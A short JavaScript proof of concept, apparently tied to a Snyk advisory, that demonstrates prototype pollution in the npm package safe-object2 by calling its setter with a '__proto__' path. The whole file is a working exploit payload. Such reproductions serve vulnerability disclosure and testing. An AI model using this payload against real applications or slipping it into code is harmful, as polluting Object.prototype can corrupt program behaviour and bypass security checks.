//https://snyk.io/vuln/SNYK-JS-SAFEOBJECT2-598801
 
  const safeObj2 = require("safe-object2");
  const obj = safeObj2({});

   

  obj.setter(["__proto__", "polluted"], "yes");
// End of file
